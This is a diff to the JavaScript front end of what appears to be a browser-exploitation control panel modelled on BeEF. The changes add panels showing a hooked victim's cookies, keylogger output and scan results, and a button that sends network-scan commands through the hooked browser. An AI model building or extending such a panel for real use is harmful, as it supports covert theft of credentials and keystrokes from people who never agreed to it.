@@ -93,7 +93,9 @@ function GetTree(){
     		$("#ua").html(data[treeNode.treeId].ua);
     		$("#hook_id").html(data[treeNode.treeId].hook_id);
     		$("#browser_version").html(data[treeNode.treeId].browser_version);
-    		$("#victim_cookie").html(data[treeNode.treeId].cookies)
+    		$("#victim_cookie").html(data[treeNode.treeId].cookies);
+    		$("#keylogger").html(data[treeNode.treeId].log);
+    		$("#scan_result").html(data[treeNode.treeId].scan_result);
     		Draw_network(treeNode.treeId);
 		}
 	
@@ -115,32 +117,9 @@ $(document).ready(function(){
 
 		var startx = 100;
 		var starty = 100;
-/*
-		var beef = new Image();
-		beef.src="beef.jpg";
-		beef.onload = function(){
-			ctx.drawImage(beef,startx,starty,picxy,picxy);
-			ctx.beginPath();
-			linex = startx+picxy;
-			liney = starty+Math.floor(picxy/2); 
-			ctx.moveTo(linex,liney);
-			ctx.lineTo(linex+80,liney);
-			picstartx = linex+80;
 
-			ctx.stroke();
-		};
-
-		var browser = new Image();
-		browser.src = "IE.jpeg";
-		browser.onload = function(){
-			ctx.drawImage(browser,picstartx,liney-25,50,50);
-			ctx.font = "12px sans-serif";
-			ctx.fillText("hook browser",picstartx,liney+37);
-		}
-*/
 		var point_x;
 		var point_y; 
-
 
 
 		function DrawPic(pic_name,start_pic_x,start_pic_y,text) {
@@ -234,6 +213,19 @@ $(document).ready(function(){
 
 		});
 	});
+
+	$("button#scan").click(function(){
+		var cmd_id = $('#hook_id').text();
+		var scan_ip = $('#scan_ip').val();
+		
+		$.ajax({
+			url:'scan',
+			method:"POST",
+			data:{"scan_ip":scan_ip,"cmd_id":cmd_id},
+
+		});
+	});
+
 
 });
 
